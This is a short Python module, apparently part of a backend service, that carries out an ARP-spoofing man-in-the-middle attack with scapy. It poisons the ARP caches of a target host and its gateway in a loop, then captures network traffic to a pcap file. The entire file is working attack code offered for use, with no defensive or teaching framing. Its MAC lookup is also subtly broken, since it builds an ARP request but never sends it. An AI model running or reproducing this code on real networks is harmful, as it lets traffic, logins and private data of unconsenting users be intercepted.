# backend/services/mitm.py

from scapy.all import ARP, Ether, send, sniff, wrpcap
import threading
import time

def arp_spoof(target_ip, gateway_ip, iface):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    def spoof():
        try:
            while True:
                send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=False)
                send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)
                time.sleep(2)
        except KeyboardInterrupt:
            restore(target_ip, gateway_ip, target_mac, gateway_mac)

    threading.Thread(target=spoof, daemon=True).start()

def get_mac(ip):
    pkt = ARP(pdst=ip)
    ans = sniff(filter=f"arp and host {ip}", timeout=3)
    return ans[0].hwsrc if ans else None

def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac), count=5)
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac), count=5)

def sniff_traffic(iface, pcap_file="mitm.pcap", count=100):
    packets = sniff(iface=iface, count=count)
    wrpcap(pcap_file, packets)
    return {"captured_packets": count, "saved_to": pcap_file}
